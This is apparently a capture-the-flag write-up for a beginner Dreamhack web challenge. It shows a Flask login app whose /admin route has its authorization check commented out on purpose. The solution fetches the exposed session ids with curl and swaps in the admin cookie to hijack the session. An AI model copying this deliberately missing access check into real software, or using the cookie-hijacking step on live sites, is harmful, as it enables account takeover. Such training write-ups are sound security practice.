---
title: session-basic
author: thanguyen165
date: 2023-01-01 07:00:00 +0700
categories: [Practice, dreamhack]
tags: [Web Exploitation, dreamhack]
---

* Level: 1
* Link: [https://dreamhack.io/wargame/challenges/409/](https://dreamhack.io/wargame/challenges/409/)

## Description
>
> It is a simple login service that manages authentication status with cookies and sessions.
> If you successfully log in with the admin account, you can get the flag.
>
> The flag type is DH{...}.

### Attached

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

users = {
    'guest': 'guest',
    'user': 'user1234',
    'admin': FLAG
}


# this is our session storage
session_storage = {
}


@app.route('/')
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        # get username from session_storage
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            # you cannot know admin's pw
            pw = users[username]
        except:
            return '<script>alert("not found user");history.go(-1);</script>'
        if pw == password:
            resp = make_response(redirect(url_for('index')) )
            session_id = os.urandom(32).hex()
            session_storage[session_id] = username
            resp.set_cookie('sessionid', session_id)
            return resp
        return '<script>alert("wrong password");history.go(-1);</script>'


@app.route('/admin')
def admin():
    # developer's note: review below commented code and uncomment it (TODO)

    #session_id = request.cookies.get('sessionid', None)
    #username = session_storage[session_id]
    #if username != 'admin':
    #    return render_template('index.html')

    return session_storage


if __name__ == '__main__':
    import os
    # create admin sessionid and save it to our storage
    # and also you cannot reveal admin's sesseionid by brute forcing!!! haha
    session_storage[os.urandom(32).hex()] = 'admin'
    print(session_storage)
    app.run(host='0.0.0.0', port=8000)

```

## Analyzation

The server did not block users when accessing admin page

```python
@app.route('/admin')
def admin():
    # developer's note: review below commented code and uncomment it (TODO)

    #session_id = request.cookies.get('sessionid', None)
    #username = session_storage[session_id]
    #if username != 'admin':
    #    return render_template('index.html')

    return session_storage
```

So just get in that page.

## Solution

```sh
curl http://host3.dreamhack.games:21057/admin
```

```javascript
{"008a1e27e3bb2fc6d0deb79b5c46044abc4d497347ba0eb658c195420fe742da":"admin",
"24fd326c4b70adad5b9bb337f3435e1d574171601fbdf42238136dd3f7515fa2":"guest",
"8c78158912071023499de32ae33de73a1dcbe253fb17a49506e84d5f944d929a":"guest"}
```

Now we just login with the given account in the server 
```
'guest': 'guest'
```
Then change the cookie to admin's cookie.

The flag is
```
DH{8f3d86d1134c26fedf7c4c3ecd563aae3da98d5c}
```